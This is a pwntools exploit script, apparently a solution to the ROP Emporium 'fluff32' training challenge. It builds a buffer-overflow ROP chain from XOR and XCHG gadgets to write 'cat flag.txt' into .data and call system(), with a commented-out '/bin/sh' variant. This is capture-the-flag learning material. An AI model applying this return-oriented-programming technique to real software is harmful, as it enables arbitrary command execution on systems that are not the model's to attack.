#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fluff32')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)

def write(write_addr, string):
    # We want to control ecx (address) and edx (string to write)
    # Ebx needs to be null because it gets XORed with ecx before writing
    GADGET1 = 0x08048671 # xor edx,edx; pop esi; mov ebp,0xcafebabe; ret
    GADGET2 = 0x0804867b # xor edx,ebx; pop ebp; mov edi,0xdeadbabe; ret
    GADGET3 = 0x08048689 # xchg edx,ecx; pop ebp; mov edx,0xdefaced0; ret
    GADGET4 = 0x08048693 # mov DWORD PTR [ecx],edx; pop ebp; pop ebx; xor BYTE PTR [ecx],bl; ret
    POP_EBX = 0x080483e1 

    chain = ""
    string += "\x00"
    if len(string) % 4 != 0:
        string = string + "\x00"*(4 - len(string) % 4)
    for i in range(0, len(string), 4):
        # Put address in ebx
        chain += p32(POP_EBX)
        chain += p32(WRITE_ADDR+i)

        # Zero out edx
        chain += p32(GADGET1)
        chain += "junk" # esi

        # Xor ebx with edx to move address into edx
        chain += p32(GADGET2)
        chain += "junk" # ebp

        # Exchange edx with ecx (setup ecx)
        chain += p32(GADGET3)
        chain += "junk" # ebp

        # Put string in ebx
        chain += p32(POP_EBX)
        chain += string[i:i+4]

        # Zero out edx
        chain += p32(GADGET1)
        chain += "junk" # esi

        # Xor ebx with edx to move string into edx
        chain += p32(GADGET2)
        chain += "junk" # ebp

        # Write
        chain += p32(GADGET4)
        chain += "junk" # ebp
        chain += p32(0x00000000) # ebx
    return chain


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

SYSTEM_ADDR = exe.sym.system
WRITE_ADDR = 0x0804a028 # .data
# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616c)
payload = "A" * OFFSET
# payload += write(WRITE_ADDR, "/bin/sh")
payload += write(WRITE_ADDR, "cat flag.txt")

payload += p32(SYSTEM_ADDR) 
payload += "junk"
payload += p32(WRITE_ADDR)
io.sendline(payload)

io.interactive()

